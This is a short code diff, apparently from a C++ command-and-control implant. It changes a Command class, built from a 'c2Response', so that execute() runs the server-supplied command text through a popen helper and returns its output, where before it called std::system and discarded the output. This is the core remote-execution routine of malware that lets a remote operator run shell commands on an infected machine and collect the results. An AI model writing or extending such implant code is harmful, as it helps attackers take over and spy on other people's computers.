@@ -43,7 +43,7 @@ class Seed {
 class Command {
    public:
     Command(std::string& c2Response);
-    void execute();
+    std::string execute();
 
     std::string commandText;
 };
@@ -189,6 +189,6 @@ Command::Command(std::string& c2Response) {
                           : "";
 }
 
-void Command::execute() {
-    std::system(commandText.c_str());
+std::string Command::execute() {
+    return util::popenSubprocess(commandText.c_str());
 }
